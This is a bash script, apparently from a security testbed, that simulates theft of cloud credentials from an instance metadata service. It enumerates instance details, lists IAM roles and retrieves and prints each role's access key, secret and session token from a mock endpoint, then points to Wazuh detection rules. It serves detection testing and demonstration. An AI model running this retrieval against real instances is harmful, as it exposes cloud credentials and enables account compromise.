#!/bin/bash
# IMDS Attack Simulation Script
# For NHI Security Testbed demonstration
# This script simulates credential theft from AWS IMDS

set -e

# Mock IMDS endpoint (in testbed, this is mock-imds service)
IMDS_ENDPOINT="${IMDS_ENDPOINT:-http://172.41.0.100:1338}"

echo "=========================================="
echo "IMDS Credential Theft Simulation"
echo "=========================================="
echo ""
echo "[!] WARNING: This is a DEMONSTRATION script"
echo "[!] These actions would be malicious in a real environment"
echo ""

# Step 1: Check if IMDS is accessible
echo "[1] Checking IMDS availability..."
if curl -s --connect-timeout 2 "$IMDS_ENDPOINT/latest/meta-data/" > /dev/null 2>&1; then
    echo "    [+] IMDS is accessible at $IMDS_ENDPOINT"
else
    echo "    [-] IMDS not accessible. Is mock-imds running?"
    exit 1
fi

# Step 2: Enumerate metadata (reconnaissance)
echo ""
echo "[2] Enumerating instance metadata..."
echo "    Instance ID:"
curl -s "$IMDS_ENDPOINT/latest/meta-data/instance-id" 2>/dev/null || echo "    (unavailable)"
echo ""
echo "    Instance Type:"
curl -s "$IMDS_ENDPOINT/latest/meta-data/instance-type" 2>/dev/null || echo "    (unavailable)"
echo ""

# Step 3: List available IAM roles
echo ""
echo "[3] Listing IAM roles attached to instance..."
ROLES=$(curl -s "$IMDS_ENDPOINT/latest/meta-data/iam/security-credentials/" 2>/dev/null)
if [ -n "$ROLES" ]; then
    echo "    [+] Found IAM role(s): $ROLES"
else
    echo "    [-] No IAM roles found"
    exit 0
fi

# Step 4: CREDENTIAL THEFT - Get role credentials
echo ""
echo "[4] STEALING CREDENTIALS from IAM role..."
echo "    [!] THIS IS THE CRITICAL ATTACK STEP"
echo ""

for ROLE in $ROLES; do
    echo "    Retrieving credentials for role: $ROLE"
    CREDS=$(curl -s "$IMDS_ENDPOINT/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null)

    if [ -n "$CREDS" ]; then
        echo ""
        echo "    [+] CREDENTIALS STOLEN:"
        echo "    ========================"
        echo "$CREDS" | jq . 2>/dev/null || echo "$CREDS"
        echo "    ========================"
        echo ""

        # Extract individual values
        ACCESS_KEY=$(echo "$CREDS" | jq -r '.AccessKeyId' 2>/dev/null)
        SECRET_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey' 2>/dev/null)
        TOKEN=$(echo "$CREDS" | jq -r '.Token' 2>/dev/null)

        if [ "$ACCESS_KEY" != "null" ] && [ -n "$ACCESS_KEY" ]; then
            echo "    Access Key ID: $ACCESS_KEY"
            echo "    Secret Key: ${SECRET_KEY:0:10}...(truncated)"
            echo "    Session Token: ${TOKEN:0:20}...(truncated)"
        fi
    fi
done

echo ""
echo "=========================================="
echo "Attack Simulation Complete"
echo "=========================================="
echo ""
echo "In a real attack, the attacker would now:"
echo "  1. Export these credentials"
echo "  2. Use them from a different machine"
echo "  3. Perform actions as the compromised role"
echo ""
echo "Check Wazuh Dashboard for alerts!"
echo "Expected rules: 100650, 100651"
